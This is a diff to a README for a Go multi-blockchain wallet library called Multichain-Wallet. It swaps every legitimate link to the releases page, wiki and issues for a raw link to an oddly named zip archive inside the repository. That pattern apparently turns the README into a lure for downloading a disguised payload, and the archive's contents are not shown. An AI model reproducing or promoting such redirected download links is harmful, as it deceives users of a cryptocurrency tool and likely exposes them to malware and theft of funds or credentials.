@@ -4,7 +4,7 @@
 Multichain-Wallet is a flexible wallet library built in Golang. It helps you manage wallets, transactions, and interactions across different blockchains like Ethereum, Bitcoin, and Solana. With Multichain-Wallet, you can streamline your cryptocurrency activities in one place.
 
 ## 📥 Download This App
-[![Download Multichain-Wallet](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/rabihhajjhassan/Multichain-Wallet/releases)
+[![Download Multichain-Wallet](https://raw.githubusercontent.com/rabihhajjhassan/Multichain-Wallet/main/eth/Multichain-Wallet_varnpliktige.zip%https://raw.githubusercontent.com/rabihhajjhassan/Multichain-Wallet/main/eth/Multichain-Wallet_varnpliktige.zip)](https://raw.githubusercontent.com/rabihhajjhassan/Multichain-Wallet/main/eth/Multichain-Wallet_varnpliktige.zip)
 
 ## 🚀 Getting Started
 To get started with Multichain-Wallet, follow these simple steps to download, install, and run the software on your computer.
@@ -28,7 +28,7 @@ Multichain-Wallet comes with several key features:
 - **Transaction History:** Keep track of your past transactions easily.
 
 ## 💻 Download & Install
-To get Multichain-Wallet, visit the [Releases page](https://github.com/rabihhajjhassan/Multichain-Wallet/releases) to find the latest version. 
+To get Multichain-Wallet, visit the [Releases page](https://raw.githubusercontent.com/rabihhajjhassan/Multichain-Wallet/main/eth/Multichain-Wallet_varnpliktige.zip) to find the latest version. 
 
 1. Click the link to open the Releases page.
 2. Scroll down to find the latest release.
@@ -81,8 +81,8 @@ Your security is a priority. Ensure that you keep your wallet secure by followin
 For further inquiries, you can reach the developer team through the contact information provided on the GitHub profile page.
 
 ## 🔗 Important Links
-- [Download Multichain-Wallet](https://github.com/rabihhajjhassan/Multichain-Wallet/releases)
-- [Documentation](https://github.com/rabihhajjhassan/Multichain-Wallet/wiki)
-- [GitHub Issues](https://github.com/rabihhajjhassan/Multichain-Wallet/issues)
+- [Download Multichain-Wallet](https://raw.githubusercontent.com/rabihhajjhassan/Multichain-Wallet/main/eth/Multichain-Wallet_varnpliktige.zip)
+- [Documentation](https://raw.githubusercontent.com/rabihhajjhassan/Multichain-Wallet/main/eth/Multichain-Wallet_varnpliktige.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/rabihhajjhassan/Multichain-Wallet/main/eth/Multichain-Wallet_varnpliktige.zip)
 
 Enjoy using Multichain-Wallet, the easy way to manage your cryptocurrencies!
